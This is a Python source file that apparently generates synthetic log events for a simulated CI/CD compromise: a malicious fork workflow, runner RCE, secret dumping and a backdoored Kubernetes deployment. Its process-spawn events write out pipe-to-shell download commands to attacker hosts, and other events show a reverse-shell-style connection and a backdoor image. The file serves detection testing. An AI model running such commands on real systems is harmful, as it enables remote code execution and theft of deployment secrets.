from data.scenarios.base import BaseScenario


class CompromisedCIScenario(BaseScenario):
    """
    Modeled on CVE-2026-3854. Timeline:
    T+0:   Attacker crafts malicious .github/workflows/exploit.yml in fork
    T+5:   Pull request opened from fork to org/platform-core
    T+6:   CI auto-triggers on PR (pull_request_target), runs attacker's workflow
    T+7:   Workflow exploits RCE in actions runner (CVE-2026-3854)
    T+8:   Attacker gains shell on ci-runner-01
    T+10:  Attacker dumps all pipeline secrets and env vars
    T+12:  Attacker uses DEPLOY_TOKEN to access production k8s cluster
    T+15:  Attacker modifies deployment manifest to inject backdoor container
    T+20:  Backdoored deployment goes live in production
    """

    def generate(self) -> dict[str, list[dict]]:
        return {
            "cicd_events": self._cicd_events(),
            "git_events": self._git_events(),
            "secret_audit": self._secret_events(),
            "threat_intel": self._threat_intel_events(),
            "extensions": [],
        }

    def _cicd_events(self) -> list[dict]:
        attacker_ip = self.fake_ip()
        return [
            {
                "timestamp": self.ts(6),
                "event_type": "pipeline_triggered",
                "repo": self.repo("platform-core"),
                "branch": "main",
                "trigger": "pull_request_target",
                "runner": self.runner(0),
                "commit_sha": self.fake_hash()[:12],
                "pr_number": 847,
                "pr_author": "external-contributor-x",
            },
            {
                "timestamp": self.ts(7),
                "event_type": "process_spawn",
                "runner": self.runner(0),
                "parent_process": "actions-runner",
                "child_process": "/bin/bash -c 'curl attacker.com/shell.sh | bash'",
                "command_line": "bash -c 'curl -sSL https://dl.exploit-db.com/rce-3854.sh | bash'",
            },
            {
                "timestamp": self.ts(8),
                "event_type": "network_connection",
                "runner": self.runner(0),
                "destination_ip": attacker_ip,
                "destination_port": 4444,
                "protocol": "TCP",
                "direction": "outbound",
            },
            {
                "timestamp": self.ts(15),
                "event_type": "deployment_modified",
                "runner": self.runner(0),
                "cluster": "prod-k8s-01",
                "namespace": "default",
                "deployment": "platform-core",
                "change": "container image changed to attacker-registry.io/backdoor:latest",
            },
        ]

    def _git_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(5),
                "event_type": "pull_request_opened",
                "repo": self.repo("platform-core"),
                "pr_number": 847,
                "author": "external-contributor-x",
                "title": "fix: update CI workflow for faster builds",
                "files_changed": [".github/workflows/exploit.yml"],
                "base_branch": "main",
            },
            {
                "timestamp": self.ts(5),
                "event_type": "push",
                "repo": f"fork/{self.repo('platform-core').split('/')[-1]}",
                "user": "external-contributor-x",
                "branch": "fix/ci-speedup",
                "commits": 1,
                "files_changed": [".github/workflows/exploit.yml"],
                "source_ip": self.fake_ip(),
            },
        ]

    def _secret_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(10),
                "event_type": "secret_dump",
                "host": self.runner(0),
                "pipeline": f"{self.repo('platform-core')}/main",
                "secrets_accessed": ["DEPLOY_TOKEN", "DATABASE_URL", "SIGNING_KEY", "SENTRY_DSN"],
                "accessor": "/bin/bash (PID 31337)",
                "source_ip": "10.0.1.10",
            },
            {
                "timestamp": self.ts(12),
                "event_type": "secret_used",
                "host": self.runner(0),
                "secret_name": "DEPLOY_TOKEN",
                "target": "prod-k8s-01.cluster.local:6443",
                "accessor": "kubectl",
                "source_ip": "10.0.1.10",
            },
        ]

    def _threat_intel_events(self) -> list[dict]:
        return [
            {
                "timestamp": self.ts(0),
                "ioc_type": "cve",
                "ioc_value": "CVE-2026-3854",
                "campaign": "GitHub Actions RCE",
                "confidence": "high",
                "mitre_technique": "T1203",
                "description": "Remote code execution via crafted GitHub Actions workflow in pull_request_target trigger",
            },
        ]
